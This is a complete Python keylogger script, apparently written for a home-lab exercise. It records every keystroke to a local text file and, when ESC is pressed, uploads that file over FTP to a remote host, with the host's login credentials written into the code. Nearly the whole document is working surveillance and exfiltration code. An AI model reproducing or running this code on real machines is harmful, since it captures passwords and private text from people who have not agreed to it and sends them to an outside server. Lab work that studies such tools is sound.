import pynput
from pynput.keyboard import Key, Listener
from ftplib import FTP

# Counter to keep track of how many keys were collected before writing to file
count=0
# List that temporarily stores keypresses before writing them to the log
keys=[]
# Name of the file where keystrokes will be saved 
file = "keylogs.txt"

# Exfiltration Function. This exfiltrates the keylog file to an FTP server running on the Ubuntu VM.
def exfiltrate_file(file):
	try:
		# Connect to the FTP server hosted on the Ubuntu VM
		ftp = FTP("10.0.0.58")
		# Log in with user credentials (vmuser)
		ftp.login("vmuser", "ab12cd34")
		 # Open the log file in binary mode and upload it
		with open(file, "rb") as f:
			ftp.storbinary(f"STOR {file}", f)
		ftp.quit()
		print("Exfiltrated " + file + " to Ubuntu VM")
	except Exception as e:
		print("Exfiltration failed:", e)

# Key press function. This Handles every keypress, stores the key in a list, prints it to the terminal, and triggers a file write each time a key is pressed.
def on_press(key):
	global keys, count
	keys.append(key)
	count += 1
	 # Print keypress to terminal
	print("{0} pressed".format(key))
	 # Since count is incremented on every keypress, this writes each individual key to the log file immediately and resets the count and keys variables to prevent duplicates.
	if count > 0:
		count = 0
		write_file(keys)
		keys = []

# File writer function. This writes keystrokes to the text file. It handles normal characters, shifts, spaces, and other special keys (shift, alt, esc, etc.)
def write_file(keys):
	with open(file, "a") as f:
		for key in keys:
			 # Convert pynput Key object to readable string
			k = str(key)
			# Handles normal characters like 'a' or 'b'
			if k.startswith("'") and k.endswith("'"):
				# Strip the quotes to get the character by itself
				letter  = k.strip("'")
				f.write(letter)
			# Ignore shift keys so they don't print to the text file. We know if the user pressed shift when there are capital letters in the text file
			elif k.startswith("Key.shift"):
				f.write("")
			# Insert a newline whenever the space key is pressed. This makes the text file easier to read
			elif k.startswith("Key.space"):
				f.write("\n")
			# Handles any other special keys
			elif k.startswith("Key."):
				# Extract the key name
				name = k.split(".", 1)[1]
				# Insert a newline
				f.write("\n")
				# Write it in [brackets] format
				f.write(f"[{name}]")
			# Fallback incase I missed any characters with my if statements
			else:
				f.write(k)
		
# Key release function. This exfiltrates the log file to the Ubuntu VM and stops the keylogger when ESC is pressed
def on_release(key):
	if key == Key.esc:
		exfiltrate_file(file)
		return False
		
# Starts the keylogger. Listener runs until on_release returns False.
with Listener(on_press=on_press, on_release=on_release) as listener: 
	listener.join()
 
